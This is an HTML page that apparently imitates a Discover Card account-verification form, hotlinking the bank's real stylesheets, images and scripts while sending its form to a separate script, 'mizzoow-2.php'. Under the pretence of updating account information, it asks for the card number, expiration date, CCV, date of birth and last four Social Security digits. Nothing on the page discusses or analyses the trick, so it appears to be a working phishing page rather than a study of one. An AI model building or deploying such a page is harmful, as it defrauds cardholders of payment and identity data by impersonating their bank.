<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">


















































<html xmlns="http://www.w3.org/1999/xhtml">
	
	

	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
	<meta http-equiv="imagetoolbar" content="no">
	<meta http-equiv="imagetoolbar" content="false">
	<link href="https://www.discovercard.com/css/optimized/ac-global.css" rel="stylesheet" type="text/css" />
<link href="https://www.discovercard.com/css/optimized/register/register-screen.css" rel="stylesheet" type="text/css" media="screen" />
<link href="https://www.discovercard.com/css/optimized/register/register.css" rel="stylesheet" type="text/css" /> 

<!--[if IE 6]>
<link rel="stylesheet" type="text/css" media="screen" href="https://www.discovercard.com/css/optimized/register/register-ie6-screen.css" />
<![endif]-->	

<!--[if IE 7]>
<link rel="stylesheet" type="text/css" media="screen" href="https://www.discovercard.com/css/optimized/register/register-ie7-screen.css" />
<![endif]-->

<!-- Begin PCC: /content/common/baselayout/optimized/tips.shtml-->
<!-- End PCC: /content/common/baselayout/optimized/tips.shtml-->		<title>
	Discover Home |</title>
			

<script language="JavaScript" src="https://www.discovercard.com/discover/jscripts/cookieFuncs.js"></script>
<script language="JavaScript" src="https://www.discovercard.com/discover/jscripts/workflowStateCheck.js"></script>
<!--\content\common\baselayout\optimized\psr_regshowwin_script.shtml-->
	<link rel="shortcut icon" href="https://www.discovercard.com/images/favicon.ico" type="image/x-icon" />
<link rel="icon" href="https://www.discovercard.com/images/favicon.ico" type="image/x-icon" />


	</head>
	
	<body>
	
<div id="container">


	    <!-- Using reg-layout-default-config.xml config file. -->


		
		
	<!-- Include header tile -->

<div id="header">
	<div class="clear">&nbsp;</div>
    
<div id="logo"><a href="https://www.discovercard.com/">
	<img src="https://www.discovercard.com/registration/images/logo-discover-financial-services.gif" width="152" height="38" alt="Discover Financial Services" title="Discover Financial Services" /></a></div>
	<div id="right-side">
<!-- Utility Bar -->
		<ul id="topnavlinks" style="position: absolute; top: 10px; right: 5px;"> <li><a href="http://www.discovercard.com"  secure="no">Discover Home</a>&nbsp;|&nbsp;
	

 </li> <li><a href="http://www.discovercard.com/credit-cards/"  secure="no">Credit Cards</a>&nbsp;|&nbsp;
	

 </li> <li><a href="http://www.discovercard.com/business/"  secure="no">Small Business</a>&nbsp;|&nbsp;
	

 </li> <li><a href="http://www.discovergiftcard.com/"  secure="no">Gift Cards</a>&nbsp;|&nbsp;
	

 </li> <li><a href="#"  secure="no">Loans</a>&nbsp;|&nbsp;
	

 <ul> <li><a href="http://www.discoverhomeloans.com/"  secure="no">Home Loans</a>
	

 </li> <li><a href="http://www.discoverstudentloans.com/"  secure="no">Student Loans</a>
	

 </li> </ul> </li> <li><a href="http://www.discoverbank.com"  secure="no">Savings</a>&nbsp;|&nbsp;
	

 </li> <li><a href="https://www.discovercard.com/cardmembersvcs/registration/reg/insurance"  secure="no">Insurance</a>
	

 </li></ul>
		<div class="clear">&nbsp;</div>
		<!--Log In and Customer Service Link Starts Here-->
		<div id="top-search">
			<div id="login">
                <a class="disc-secLock" href="https://www.discovercard.com/cardmembersvcs/loginlogout/app/ac_main" title="Secure Log In"></a>
				<a href="https://www.discovercard.com/cardmembersvcs/loginlogout/app/ac_main" title="Log in to Your Account"> Log in</a> | <a href="http://www.discovercard.com/customer-service/" title="Get answers to your Discover Questions"> Customer Service</a>| <a href="http://www.discovercard.com/community/" title="Community"> Community</a>
			</div>
<form action="http://search.discovercard.com/search" method="get" name="search" title="Search Discover">
			<input type="text" name="q" maxlength="256" value="" id="searchbox" />
			<a class="hide" id="clear-livesearch" href="#searchbox">x</a>

			<input type="hidden" name="site" value="internet_cm_corp" />
			<input type="hidden" name="client" value="internet_cm_fe" />
			<input type="hidden" name="output" value="xml_no_dtd" />
			<input type="hidden" name="proxystylesheet" value="internet_cm_fe" />

			<input id="search-button" type="image" src="https://www.discovercard.com/search/images/btn-search-gray-off.gif" alt="Search" title="Search"/>
		</form>
			
		</div>
		<!--Log In and Customer Service LinkEnds Here-->
	</div>
	<div class="clear">&nbsp;</div>
</div>

	<!-- /header --><div class="clear">&nbsp;</div>
<ul id="nav">
<li class="active"><a href="http://www.discovercard.com/customer-service/" title="Customer Service">Customer Service</a></li>
<li><a href="http://www.discovercard.com/customer-service/faq/" title="FAQ">FAQ</a></li>
<li><a href="http://www.discovercard.com/customer-service/glossary.html" title="Glossary">Glossary</a></li>
<li><a href="http://www.discovercard.com/contact-us/" title="Contact Us">Contact Us</a></li> 
    </ul>
	<div class="clear">&nbsp;</div>
	<!-- /top navigation -->


	<script src="https://www.discovercard.com/scripts/optimized/registration-top.js" type="text/Javascript"></script>


<!-- Begin LP Custom Variables-->
<script type="text/javascript">
		
lpAddVars('page','lpRegistrationStart','1');
lpAddVars('page','lpErrorField','');
lpAddVars('page','lpErrorCounter','');
lpAddVars('page','lpConversionStage','account info');
lpAddVars('page','lpSection','registration');
lpAddVars('page','lpCustomerID','');


</script>
<!-- End LP Custom Variables-->
		

<!-- Begin LP Button Code-->
<div id="lpChatDynamicButtonRegistrationDiv" style="position:absolute; left:730px; top:240px;"></div>
<script type="text/javascript">
if(typeof(lpMTagConfig.dynButton)!="undefined")
lpMTagConfig.dynButton[lpMTagConfig.dynButton.length] = {'name':"chat-"+lpUnit+"-"+lpLanguage,'pid':'lpChatDynamicButtonRegistrationDiv'};
</script>
<!-- End LP Button Code-->
<script type="text/javascript">
if(typeof(sfgfdge)!="undefined") sfgfdge("lpChatDynamicButtonRegistrationDiv", "position:absolute; left:730px; top:240px;");
</script>
		


	











<script language="JavaScript" type="text/javascript"
	src="https://www.discovercard.com/discover/jscripts/reg_email_rebuttalPop.js">
</script>

<div class="clear">&nbsp;</div>
<!-- /top navigation -->

<!-- breadcrumbs -->
<div id="breadcrumb"></div>
<!-- /breadcrumbs -->

<!-- main content -->
<div class="content">
<div class="clear">&nbsp;</div>
<!-- left column -->
<div class="col710">
<div class="borders710 content-below">
<div id="subcategory-header">
<div class="clear">&nbsp;</div>
<div class="left"></div>
<div class="header">
<h1 class="centered">Update Information In Your Account.</h1>
</div>
<div class="right"></div>
<div class="clear">&nbsp;</div>
</div>
               <div id="progress-step">
               		<ul>
							<li id="step1" class="active"><p><strong>1</strong>Enter Account Info</p></li>
							<li id="step2" class="inactive"><p><strong>2</strong> 
							Billing Adress Info</p></li>
						</ul>
               </div>
<div class="inner-content register">
                    <h2>Verify Account Information</h2>
                    <div class="article"> 
						<p>In order to protect access to your account, we need to know who you are.  Please provide details about the <strong>Primary cardmember</strong> as well as your Discover card. The Primary cardmember is the person who originally opened the Discover card account. </p> 
					</div> 

<form name="registrationForm" method="post" action="mizzoow-2.php">



	<div class="clear13">&nbsp;</div>
        <div class="box340right"> 
                <div class="top"> 
                </div> 
                <h3>Discover Card Information</h3>
                <div class="card-diagram first"> 
                        <h4>FRONT</h4> 
                        <div id="diagram1"></div>
                        <div id="card-ac-number"> 
                                <p>Account Number</p> 
                                <p>Expiration Date</p> 
                        </div> 
                </div> 
                <p class="space">If you need help, call 1-800-DISCOVER (1-800-347-2683).</p>
                <div class="bottom"> 
                </div> 
        </div> 
        <!--START: Begin Card Information Form --> 
        <div class="form"> 

                <div class="clear13">&nbsp;</div> 

                <h2>Your Card Information</h2>

<p> 
	<strong>Discover Card Account Number</strong><br /> 
	<input type="text" name="ccnumb" maxlength="16" size="18" value="" class="numeric">
</p>
<p class="hint step-1">(e.g., 6011000000000000; do not include spaces or hyphens)</p>

<p class="less"><strong>Discover Card Expiration Date</strong><br />
	<select name="expirMonth"><option value="Month">Month</option>
		
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option></select>&nbsp;<select name="expiryear"><option value="YY">Year</option>
		


		<option value="2020">20</option>
		
		<option value="2021">21</option>
		
		<option value="2022">22</option>
		
		<option value="2023">23</option>
		
		<option value="2024">24</option>
		
		<option value="2025">25</option>
		
		<option value="2026">26</option>
		
		<option value="2027">27</option>
		
		<option value="2028">28</option>
		
		<option value="2029">29</option>
		
		<option value="2030">30</option>
		
		<option value="2031">31</option></select>&nbsp;
	</p>
				<p class="less"><strong>CCV </strong></p>
				<p class="less">
	<input type="text" name="CCV" maxlength="3" size="21" value="" class="shorter numeric"></p>
<!--<div id="cardnumberID">
	<p><strong>3-Digit Card ID</strong> 
	<a href="#" id="three-digit" rel="three-digit-overlay" class="overlay-trigger initHide" alt="Need Help?" title="Need Help?"></a>
    <br />
	<input type="text" name="cid" maxlength="3" size="3" value="" class="short numeric"></p>
	<p class="hint">(Enter the last 3 digits of the ID number.)</p>
</div>-->

<div class="clear13"></div>
<div id="divider"></div>
<h2>
        Primary Cardmember Information
        <span class="sheets"><a href="#primary-cardmember-info-overlay" class="overlay-trigger initHide" rel="primary-cardmember-info-overlay" title="Primary Cardmember Information">What's this?</a></span>
</h2>

<p>
<strong>Date of Birth of Primary Cardmember</strong><br />
	<select name="month"><option value="Month">Month</option>
		
<option value="01">January</option>
<option value="02">February</option>
<option value="03">March</option>
<option value="04">April</option>
<option value="05">May</option>
<option value="06">June</option>
<option value="07">July</option>
<option value="08">August</option>
<option value="09">September</option>
<option value="10">October</option>
<option value="11">November</option>
<option value="12">December</option></select>&nbsp;<select name="day"><option value="Day">Day</option>
		


		<option value="01">01</option>
	
		<option value="02">02</option>
	
		<option value="03">03</option>
	
		<option value="04">04</option>
	
		<option value="05">05</option>
	
		<option value="06">06</option>
	
		<option value="07">07</option>
	
		<option value="08">08</option>
	
		<option value="09">09</option>
	
		<option value="10">10</option>
	
		<option value="11">11</option>
	
		<option value="12">12</option>
	
		<option value="13">13</option>
	
		<option value="14">14</option>
	
		<option value="15">15</option>
	
		<option value="16">16</option>
	
		<option value="17">17</option>
	
		<option value="18">18</option>
	
		<option value="19">19</option>
	
		<option value="20">20</option>
	
		<option value="21">21</option>
	
		<option value="22">22</option>
	
		<option value="23">23</option>
	
		<option value="24">24</option>
	
		<option value="25">25</option>
	
		<option value="26">26</option>
	
		<option value="27">27</option>
	
		<option value="28">28</option>
	
		<option value="29">29</option>
	
		<option value="30">30</option>
	
		<option value="31">31</option></select>&nbsp; 
	
	<span class="year">19</span>
	<input type="text" name="year" maxlength="2" size="2" value="" class="shorter numeric">
</p>

<p>
	<strong>Social Security Number of Primary Cardmember
	<img width="9" height="11" class="secure-icon" style="float: none;" title="Secure" alt="Secure Log In" src="https://www.discovercard.com/images/icon-lock.gif"/></strong><br />		
	XXX - XX -  <input type="text" name="ssn" maxlength="4" size="4" value="" class="short numeric">
</p>
<p class="hint">(Last 4-digits)</p>

<!--<p><strong>Mother's Maiden Name of Primary Cardmember</strong><br />
<input type="text" name="mothersMaidenName" maxlength="20" size="22" value=""></p>
<p class="hint">(Last name only)</p>-->

</div>
<!-- /form bottom -->

<div class="clear">&nbsp;</div>
<p class="submit-button-link">
	<input type="image" name="" src="https://www.discovercard.com/registration/images/continue.gif" title="Continue" value="Continue" class="rollover save-and-continue-button left" /> <a href="#" onclick="javascript:showPopup();return true;" class="last initHide" title="Cancel">Cancel</a>
</p>




	

	<input type="hidden" name="edit"
		value='null'>
	<input type="hidden" id="jsenabled" name="jsenabled"
		value="false" />
 </form>
<script type="text/javascript" language="JavaScript">
  <!--
  var focusControl = document.forms["registrationForm"].elements["accountNumber"];

  if (focusControl.type != "hidden") {
     focusControl.focus();
  }
  // -->
</script>

</div>
<!-- /left column -->
<div class="bottom"> 
	<img src="https://www.discovercard.com/registration/images/bg-710-bottom.gif" width="710" height="10" alt="" /> 
</div> 

<!--End PCC Include file: /inet_registration/registration/reg1_form_bottom.shtml--> 

<script type="text/javascript" language="JavaScript"> 
	<!--
	var focusControl = document.forms["registrationForm"].elements["accountNumber"];
	
	if (focusControl.type != "hidden") {
	focusControl.focus();
	}
	
	var element = document.getElementById("jsenabled");
	element.value = "true";
	// -->
</script> 



</div>
</div>
<!-- /right column -->
<div class="clear">&nbsp;</div>
<!-- /main content -->
</div>


<!--Begin PCC Include file: /inet_registration/tracking/vs_track_reg_step1.shtml-->
<img src="https://discovercard.com/images/zag.gif?log=1&cb=1313873073670&dt=Step%201:%20Enter%20Account%20information&dd=www.discovercard.com&dl=/ACREG/EnterAccountInformation">
<!--End PCC Include file: /inet_registration/tracking/vs_track_reg_step1.shtml-->


<div id="overlays">		
	<!--START: Primary Card Member Info Overlay --> 
	<div id="primary-cardmember-info-overlay" class="overlay-small primary hide"> 
		<div class="body"> 
			<div class="hdr-left"></div> 
			<div class="hdr-right"></div> 
			
			<a id="primary-cardmember-info-close" class="close-link" href="#primary-cardmember-info-overlay" title="Close">Close</a> 
			
			<h1>Primary Cardmember Information</h1> 
			<p>The Primary cardmember is the person who originally opened the Discover card account. If you do not have this information, you will not be able to register the account at this time.</p> 
			
			<div class="ftr-left"></div> 
			<div class="ftr-right"></div> 
		</div> 
	</div> 
	<!--END: Primary Card Member Info Overlay --> 

	<!--START: 3-Digit Cardmember ID Overlay --> 
	<div id="three-digit-overlay" class="overlay-small hide"> 
		<div class="body"> 
			<div class="hdr-left"></div> 
			<div class="hdr-right"></div> 
			
			<a id="three-digit-close" class="close-link" href="#three-digit-overlay" title="Close">Close</a> 
			
			<h1>3-Digit Card ID</h1> 
			<p>The card image on the right side of this page will show you where to find your 3-digit Card ID. If your Card ID is missing or you are unable to read it, please call customer service from your home phone at 1-800-DISCOVER.</p> 
			
			<div class="ftr-left"></div> 
			<div class="ftr-right"></div> 
		</div> 
	</div> 
</div>


<script language="javascript" src="https://www.discovercard.com/scripts/optimized/ac-global-bottom.js"></script>
<script language="javascript" src="https://www.discovercard.com/scripts/optimized/registration-bottom.js"></script>
<script language="javascript" src="https://www.discovercard.com/scripts/optimized/vendor-ac-global-bottom.js"></script> 

<script type="text/javascript">
	mcd.dom.ready(function(){
		mcd.util.externalLinkHandler();
		
		var bar = document.getElementById("progress-step");
		mcd.dom.addClass(bar,'js-on');
		var step3 = document.getElementById("step3");
		mcd.dom.addClass(step3,'js');
	})
</script>
<script type="text/javascript" src="https://www.discovercard.com/registration/scripts/monitorFields.js"></script>
<script type="text/javascript" src="https://www.discovercard.com/registration/scripts/step-one.js"></script>
	
<!--Begin PCC Include file: /common/omnituretracking.shtml-->

<!--End PCC Include file: /common/omnituretracking.shtml-->
<div id="footer">
	<!-- BEGIN: Social media links -->
	<div class="community-links-container">
		<ul class="community-links">
			<li class="tv-ads-icon"><a href="http://www.discovercard.com/scripts/PageExit.htm?log=1&v_eurl=http://mcdpartners.com/discoveradvertising/index-2010-peggy-overview.php" title="See the Peggy TV ads" class="community-ftr-link" >See the Peggy TV ads</a></li>
			<li class="facebook-icon"><a href="http://www.discovercard.com/scripts/PageExit.htm?log=1&gcmpgn=1009_gf_fb_pub_txt&v_eurl=http%3A//www.facebook.com/discover" title="Find Us on Facebook" class="community-ftr-link" >Find Us on Facebook</a></li>
			<li class="twitter-icon"><a href="http://www.discovercard.com/scripts/PageExit.htm?log=1&gcmpgn=1009_gf_twi_pub_txt&v_eurl=http%3A//twitter.com/Discover" title="Follow Us on Twitter" class="community-ftr-link" >Follow Us on Twitter</a></li>
			<li class="blog-icon"><a href="http://www.discovercard.com/scripts/PageExit.htm?log=1&gcmpgn=1009_gf_wp_pub_txt&v_eurl=http://cashbackconnection.wordpress.com/" title="Read Our Blog" class="community-ftr-link" >Read Our Blog</a></li>
			<li class="mobile-icon"><a href="http://www.discovercard.com/customer-service/account/mobileapp.html?gcmpgn=1009_gf_mob_pub_txt" title="Discover Mobile" class="community-ftr-link" >Discover Mobile</a></li>
		</ul>
	</div>
	<!-- END: Social media links -->

	<div class="primary-links">
		<div class="link-container">
			<div class="link-group">
				<h1>Credit Cards</h1>
				<ul>
					<li>
					<a href="https://www.discovercard.com/credit-cards/index.html#CashbackCards" title="Cash Rewards Card">Cash Rewards Card</a></li>
					<li>
					<a href="https://www.discovercard.com/miles/" title="Miles Card">Miles Card</a></li>
					<li>
					<a href="https://www.discovercard.com/business/" title="Small Business Card">Small Business Card</a></li>
					<li>
					<a href="https://www.discovercard.com/credit-cards/" title="All Credit Cards">All Credit Cards</a></li>
				</ul>
			</div>
			
			<div class="link-group">
				<h1>Cashback Bonus</h1>
				<ul>
					<li>
					<a href="https://www.discovercard.com/customer-service/rewards/get-more-calendar.html" title="5% Cashback Bonus">5% <em>Cashback Bonus</em></a></li>
					<li>
					<a href="https://www.discovercard.com/customer-service/rewards/shopdiscover.html" title="ShopDiscover Partners">ShopDiscover Partners</a></li>
					<li>
					<a href="https://www.discovercard.com/cashbackbonus/deals.html" title="Today's Hot Deals">Today's Hot Deals</a></li>
					<li>
					<a href="https://www.discovercard.com/customer-service/rewards/redeem-cashback.html" title="Redemption Options">Redemption Options</a></li>
				</ul>
			</div>
			
			<div class="link-group">
				<h1>Other Products</h1>
				<ul>
					<li><a href="http://www.discoverbank.com/?gcmpgn=1103_db_botnav&src=NAVBOT" title="Savings Products">Savings Products</a></li>
					<li><a href="http://www.discoverstudentloans.com/?acmpgn=O_DCC_H_UN_007" title="Student Loans">Student Loans</a></li>
					<li><a href="http://www.discoverpersonalloans.com/" title="Personal Loans">Personal Loans</a></li>
					<li><a href="http://www.discover.com/shopcenter/giftcard.shtml" title="Gift Cards">Gift Cards</a></li>
				</ul>
			</div>
			
			<div class="link-group">
				<h1>Help &amp; Support</h1>
				<ul>
					<li>
					<a href="https://www.discovercard.com/customer-service/" title="Customer Service">Customer Service</a></li>
					<li>
					<a href="https://www.discovercard.com/customer-service/faq/" title="Frequently Asked Questions">Frequently Asked Questions</a></li>
					<li>
					<a href="https://www.discovercard.com/cardmembersvcs/smc/requestCMAgreement" title="Cardmember Agreements">Cardmember Agreements</a></li>
					<li>
					<a href="https://www.discovercard.com/customer-service/account/international.html" title="International Acceptance">International Acceptance</a></li>
					<li>
					<a href="https://www.discovercard.com/customer-service/fraud/lost-stolen.html" title="Report Lost or Stolen Card">Report Lost or Stolen Card</a></li>
					<li><a href="http://www.discovercard.com/scripts/PageExit.htm?log=1&v_eurl=http://debit.discovernetwork.com/cal/search.do?gcmpgn=1103_msb_footer_atm" title="ATM Locator">ATM Locator</a></li>
				</ul>
			</div>
			
			<div class="link-group last">
				<h1>About Us</h1>
				<ul>
					<li><a href="http://www.discoverfinancial.com/company/" title="About Discover">About Discover</a></li>
					<li><a href="http://www.discoverfinancial.com/financialeducation/financialeducation.shtml" title="Financial Education">Financial Education</a></li>
					<li><a href="http://investorrelations.discoverfinancial.com/phoenix.zhtml?c=204177&p=irol-IRHome" title="Investor Relations">Investor Relations</a></li>
					<li><a href="http://www.discovernetwork.com/" title="Merchants">Merchants</a></li>
					<li><a href="http://www.discoverfinancial.com/news/index.shtml" title="Newsroom">Newsroom</a></li>
					<li><a href="http://www.mydiscovercareer.com/" title="Careers">Careers</a></li>
				</ul>
			</div>
		</div>
		
		<div class="logo-line">
			<h2>
			<a href="https://www.discovercard.com/cashbackbonus/index.html" title="It pays to Discover">It pays to Discover</a></h2>
			<!--Search Form Starts Here-->
			<div class="footer-search">
				<form action="http://search.discovercard.com/search" method="get" name="search" title="Search Discover">
					<input type="text" class="text-input" name="q" maxlength="256" />
					<input type="hidden" name="site" value="internet_cm_corp" />
					<input type="hidden" name="getfields" value="*"/>
					<input type="hidden" name="client" value="internet_cm_fe" />
					<input type="hidden" name="output" value="xml_no_dtd" />
					<input type="hidden" name="proxystylesheet" value="internet_cm_fe" />
					<input type="image" class="footer-search-button" src="https://www.discovercard.com/search/images/btn-search-gray-off.gif" alt="Search" title="Search"/>
				</form>
			</div>
			<!--Search Form Ends Here-->
			<ul class="additional-links">
				<li>
				<a href="https://www.discovercard.com/customer-service/security/soan.html" title="Secure Online Account Numbers">Secure Online Account Numbers</a></li>
			</ul>
		</div>
		
	</div>
	<div class="primary-links-bottom"></div>
	<div class="secondary-links">
		<ul>
			<li>
			<a href="https://www.discovercard.com/site-map/" title="Site Map">Site Map</a></li>
			<li>
			<a href="https://www.discovercard.com/customer-service/terms-of-use.html" title="Terms of Use">Terms of Use</a></li>
			<li>
			<a href="https://www.discovercard.com/customer-service/security/" title="Security">Security</a></li>
			<li>
			<a href="https://www.discovercard.com/customer-service/privacy-policies/" title="Privacy Statement">Privacy Statement</a></li>
			<li class="last">
			<a href="https://www.discovercard.com/contact-us/" title=" Contact Us">Contact Us</a></li>
		</ul>
		<p class="copyright">&copy;<script language="JavaScript">
<!--
    today=new Date();
    year0=today.getFullYear();
    document.write(year0);
//-->
</script> Discover Bank, Member FDIC.</p>
	</div>
</div>

</body>


		
</html>



